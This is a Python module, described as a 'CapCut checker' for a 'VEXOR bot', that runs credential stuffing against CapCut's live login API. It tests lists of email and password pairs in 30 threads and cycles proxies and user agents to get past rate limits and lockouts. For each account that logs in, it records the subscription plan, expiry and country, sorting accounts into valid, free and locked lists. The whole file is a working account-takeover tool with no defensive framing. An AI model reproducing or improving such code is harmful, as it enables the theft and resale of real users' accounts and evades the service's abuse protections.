#!/usr/bin/env python3
"""CapCut checker module for VEXOR bot — with URL-Encoded Dict Payloads, Smart Proxy Cascade & Full Debug."""

import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
import json
import random
import re
import threading
import time

import config
from config import (
    get_proxy_for_attempt,
    log,
    report_proxy_fail,
    report_proxy_ok,
    resolve_country_code,
)
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── endpoints ───────────────────────────────────────────────
BASE_ROOT = "https://login-row.www.capcut.com"
_QS = (
    "?aid=348188&account_sdk_source=web&sdk_version=2.1.10-tiktok"
    "&language=en&verifyFp=verify_mqb0orqe_SrX6YLSJ_pYKy_4cpK_93i0_QGj4GShqvPwv"
)
CHECK_EMAIL = BASE_ROOT + "/passport/web/user/check_email_registered" + _QS
LOGIN_URL = BASE_ROOT + "/passport/web/email/login/" + _QS
SUB_INFO = "https://commerce-api-sg.capcut.com/commerce/v1/subscription/user_info"

TIMEOUT = (8.0, 15.0)
MAX_CASCADE_ATTEMPTS = 4  # 0: Static #1, 1: Static #2, 2: Res SID #1, 3: Res SID #2

THROTTLE_PHRASES = (
    "too frequent",
    "try again later",
    "rate limit",
    "access too often",
    "maximum number of attempts reached",
    "try again in 30 minute",
)
BAD_CRED_MARKERS = (
    "username or password doesn't match",
    "incorrect account or password",
    "account doesn't exist",
    '"error_code":1002',
    '"error_code":1009',
    '"error_code":1011',
)
LOCKED_MARKERS = (
    '"error_code":7',
    "temporarily locked",
    "account locked",
)

UAS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]


def _rand_ua():
  return random.choice(UAS)


def _build_session(proxy_str=None):
  s = requests.Session()
  s.verify = False
  s.trust_env = False
  if proxy_str:
    if not proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
      proxy_str = "http://" + proxy_str
    s.proxies = {"http": proxy_str, "https": proxy_str}
  return s


def _dbg(email, stage, proxy_lbl="", status_code=None, text=None, exc=None):
  parts = [f"[{email}] STAGE={stage}"]
  if proxy_lbl:
    parts.append(f"PROXY={proxy_lbl}")
  if status_code is not None:
    parts.append(f"HTTP={status_code}")
  if exc is not None:
    parts.append(f"EXC={type(exc).__name__}({exc})")
  if text is not None:
    snippet = text.strip()[:350].replace("\n", " ")
    parts.append(f"BODY={snippet!r}")
  log("capcut-dbg", " | ".join(parts), level="DEBUG")


def _check_email(session, email, proxy_lbl=""):
  headers = {
      "User-Agent": _rand_ua(),
      "Accept": "application/json, text/javascript",
      "Accept-Language": "en-US,en;q=0.9",
      "Appid": "348188",
      "Store-Country-Code": "us",
      "Store-Country-Code-Src": "uid",
      "Origin": "https://www.capcut.com",
      "Referer": "https://www.capcut.com/",
      "Content-Type": "application/x-www-form-urlencoded",
  }
  payload = {
      "mix_mode": "1",
      "email": email,
      "fixed_mix_mode": "1",
  }
  try:
    r = session.post(
        CHECK_EMAIL,
        data=payload,
        headers=headers,
        timeout=TIMEOUT,
    )
    _dbg(
        email,
        "CHECK_EMAIL",
        proxy_lbl=proxy_lbl,
        status_code=r.status_code,
        text=r.text,
    )
    return r.text
  except Exception as e:
    _dbg(email, "CHECK_EMAIL", proxy_lbl=proxy_lbl, exc=e)
    return ""


def _login(session, email, password, proxy_lbl=""):
  csrf = session.cookies.get("passport_csrf_token") or ""
  headers = {
      "User-Agent": _rand_ua(),
      "Accept": "application/json, text/javascript",
      "Accept-Language": "en-US,en;q=0.9",
      "X-Tt-Passport-Csrf-Token": csrf,
      "Appid": "348188",
      "Store-Country-Code": "us",
      "Store-Country-Code-Src": "uid",
      "Origin": "https://www.capcut.com",
      "Referer": "https://www.capcut.com/",
      "Content-Type": "application/x-www-form-urlencoded",
  }
  # Dict payload ensures special characters (&, =, +, #, %) in passwords are properly URL-encoded
  payload = {
      "mix_mode": "1",
      "email": email,
      "password": password,
      "fixed_mix_mode": "1",
  }
  try:
    r = session.post(
        LOGIN_URL,
        data=payload,
        headers=headers,
        timeout=TIMEOUT,
    )
    _dbg(
        email,
        "LOGIN",
        proxy_lbl=proxy_lbl,
        status_code=r.status_code,
        text=r.text,
    )
    return r.text
  except Exception as e:
    _dbg(email, "LOGIN", proxy_lbl=proxy_lbl, exc=e)
    return ""


def _classify_response(text):
  """Returns 'hit' | 'bad' | 'locked' | 'throttled' | 'err'"""
  if not text:
    return "err"
  s = text.strip()
  if not (s.startswith("{") or s.startswith("[")):
    return "err"
  low = s.lower()
  if '"status_code":429' in low:
    return "throttled"
  if any(p in low for p in THROTTLE_PHRASES):
    return "throttled"
  if "verify_center" in low and "redirect" in low:
    return "throttled"
  if any(m in low for m in LOCKED_MARKERS):
    return "locked"
  if any(m in low for m in BAD_CRED_MARKERS):
    return "bad"
  if '"message":"success"}' in s:
    return "hit"
  return "err"


def _get_subscription(session, email, proxy_lbl=""):
  sid_guard = session.cookies.get("sid_guard") or ""
  headers = {
      "Host": "commerce-api-sg.capcut.com",
      "Cookie": f"sid_guard={sid_guard}; ",
      "User-Agent": _rand_ua(),
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "en-US,en;q=0.5",
      "Appid": "348188",
      "Loc": "US",
      "Lan": "en",
      "Pf": "7",
      "Appvr": "12.4.0",
      "Tdid": "",
      "Sign-Ver": "1",
      "App-Sdk-Version": "48.0.0",
      "Sign": "3cea4128ae545d2c230b503989baac19",
      "Device-Time": str(int(time.time())),
      "Store-Country-Code": "mx",
      "Store-Country-Code-Src": "uid",
      "Origin": "https://www.capcut.com",
      "Referer": "https://www.capcut.com/",
      "Content-Type": "application/json",
  }
  try:
    r = session.post(
        SUB_INFO,
        json={"aid": "348188", "scene": "vip"},
        headers=headers,
        timeout=TIMEOUT,
    )
    _dbg(
        email,
        "SUB_INFO",
        proxy_lbl=proxy_lbl,
        status_code=r.status_code,
        text=r.text,
    )
    return r.text
  except Exception as e:
    _dbg(email, "SUB_INFO", proxy_lbl=proxy_lbl, exc=e)
    return ""


def _parse_sub(text):
  plan, expiry, days = "FREE", "N/A", -1
  m = re.search(r'"vip_levels":\[\{"level":"([^"]*)"', text or "")
  if m:
    plan = m.group(1).upper()
  m = re.search(r'"cycle_unit":"([^"]*)"', text or "")
  cycle = m.group(1).upper() if m else ""
  if cycle:
    plan = f"{plan}/{cycle}"
  m = re.search(r'"end_time":(\d+)', text or "")
  if m:
    eut = int(m.group(1))
    if eut > 0:
      expiry = datetime.fromtimestamp(eut, tz=timezone.utc).strftime("%Y-%m-%d")
      days = int((eut - time.time()) / 86400)
    else:
      days = -1
  return {"plan": plan, "expiry": expiry, "days": days}


def _extract_country(text):
  if not text:
    return ""
  keys = ("region", "country_code", "country", "user_region", "store_region")
  try:
    data = json.loads(text)

    def walk(node):
      if isinstance(node, dict):
        for k, v in node.items():
          if (
              k.lower() in keys
              and isinstance(v, str)
              and len(v) == 2
              and v.isalpha()
          ):
            return v.upper()
        for v in node.values():
          r = walk(v)
          if r:
            return r
      elif isinstance(node, list):
        for item in node:
          r = walk(item)
          if r:
            return r
      return ""

    found = walk(data)
    if found:
      return found
  except Exception:
    pass
  for key in keys:
    m = re.search(r'"' + re.escape(key) + r'"\s*:\s*"([A-Za-z]{2})"', text)
    if m:
      return m.group(1).upper()
  return ""


def _single_attempt(email, password, proxy_url, proxy_lbl):
  """Run one full CapCut check attempt using the specified proxy."""
  session = _build_session(proxy_url)
  try:
    reg = _check_email(session, email, proxy_lbl=proxy_lbl)
    if not reg or not reg.strip().startswith(("{", "[")):
      return "net", {}
    if '"is_registered":0' in reg:
      return "bad", {}
    reg_cls = _classify_response(reg)
    if reg_cls == "throttled":
      return "throttled", {}
    if reg_cls == "locked":
      return "locked", {}

    login_text = _login(session, email, password, proxy_lbl=proxy_lbl)
    verdict = _classify_response(login_text)
    if verdict == "throttled":
      return "throttled", {}
    if verdict == "locked":
      return "locked", {}
    if verdict == "bad":
      return "bad", {}
    if verdict != "hit":
      return "net", {}

    sub_text = _get_subscription(session, email, proxy_lbl=proxy_lbl)
    if '"errmsg":"login error"' in (sub_text or "") or not sub_text:
      return "net", {}

    info = _parse_sub(sub_text)
    country = ""
    for ck in ("store-country-code", "user-country", "region"):
      v = session.cookies.get(ck)
      if v and len(v) == 2 and v.isalpha():
        country = v.upper()
        break
    if not country:
      country = _extract_country(login_text) or _extract_country(sub_text)
    info["country"] = country

    result = "free" if info["days"] < 0 else "hit"
    return result, info
  except Exception as e:
    _dbg(email, "EXCEPTION", proxy_lbl=proxy_lbl, exc=e)
    return "net", {}
  finally:
    session.close()


def check_account(email, password, job=None):
  """Check a CapCut account using the 3-tier proxy cascade:

  Attempt 0 -> Static Proxy #1
  Attempt 1 -> Static Proxy #2 (different IP)
  Attempt 2+ -> Residential Rotating Proxy (fresh SID IP each time)
  """
  prev_proxy = None
  retried = False
  last_res = "net"

  for attempt in range(MAX_CASCADE_ATTEMPTS):
    if job and job.cancelled:
      return "net", {}
    proxy_url, proxy_lbl = get_proxy_for_attempt(attempt, prev_proxy=prev_proxy)
    prev_proxy = proxy_url
    if attempt > 0:
      retried = True
      if job:
        with job.lock:
          job.retried += 1
      log(
          "capcut-dbg",
          f"[{email}] RETRY attempt={attempt} switching to PROXY={proxy_lbl}",
          level="DEBUG",
      )

    res, details = _single_attempt(email, password, proxy_url, proxy_lbl)
    last_res = res

    if res in ("hit", "free", "bad", "locked"):
      report_proxy_ok(proxy_url)
      if retried and job:
        with job.lock:
          job.recovered += 1
      log(
          "capcut-dbg",
          f"[{email}] FINAL={res} attempt={attempt} proxy={proxy_lbl} details={details}",
          level="DEBUG",
      )
      return res, details

    report_proxy_fail(proxy_url, reason=res)
    if res == "throttled" and job:
      with job.lock:
        job.throttled += 1
    time.sleep(0.4)

  log(
      "capcut-dbg",
      f"[{email}] EXHAUSTED all {MAX_CASCADE_ATTEMPTS} attempts -> {last_res}",
      level="DEBUG",
  )
  return last_res, {}


def run(job, reporter):
  max_workers = getattr(config, "CAPCUT_THREADS", 30)
  log(
      "capcut",
      f"start chat={job.chat_id} combos={len(job.combos)} workers={max_workers}",
      level="INFO",
  )

  done_evt = threading.Event()

  def _watcher():
    while not done_evt.is_set():
      try:
        reporter()
      except Exception as e:
        log("capcut", f"reporter: {e}", "WARN")
      done_evt.wait(3)

  threading.Thread(target=_watcher, daemon=True).start()

  def worker(combo):
    if job.cancelled:
      return
    email, password = combo[0], combo[1]
    result, details = check_account(email, password, job=job)

    with job.lock:
      job.processed += 1
      job.done_keys.add((email.lower(), password))
      if result == "hit":
        job.valid += 1
        meta = {
            "plan": details.get("plan", "Premium"),
            "expiry": details.get("expiry", "N/A"),
            "days": details.get("days", 0),
            "country": details.get("country") or resolve_country_code(email),
        }
        job.valid_list.append((email, password, meta))
      elif result == "free":
        job.free += 1
        meta = {
            "plan": "FREE",
            "expiry": "N/A",
            "days": -1,
            "country": details.get("country") or resolve_country_code(email),
        }
        job.free_list.append((email, password, meta))
      elif result == "locked":
        job.twofa += 1
      elif result == "bad":
        job.bad += 1
      else:
        job.net += 1

  try:
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
      pending = set()
      for combo in job.combos:
        if job.cancelled:
          break
        while len(pending) >= max_workers * 2:
          done, pending = concurrent.futures.wait(
              pending, return_when=concurrent.futures.FIRST_COMPLETED
          )
          if job.cancelled:
            break
        if job.cancelled:
          break
        pending.add(executor.submit(worker, combo))

      for future in as_completed(pending):
        if job.cancelled:
          for fx in pending:
            fx.cancel()
          break
        try:
          future.result()
        except Exception as e:
          log("capcut", f"Worker exception: {e}", level="ERROR")
  finally:
    done_evt.set()
    try:
      reporter(force=True)
    except Exception:
      pass

  log(
      "capcut",
      f"done chat={job.chat_id} valid={job.valid} free={job.free} "
      f"bad={job.bad} 2fa={job.twofa} throttled={job.throttled} net={job.net} "
      f"retried={job.retried} recovered={job.recovered}",
      "DONE",
  )
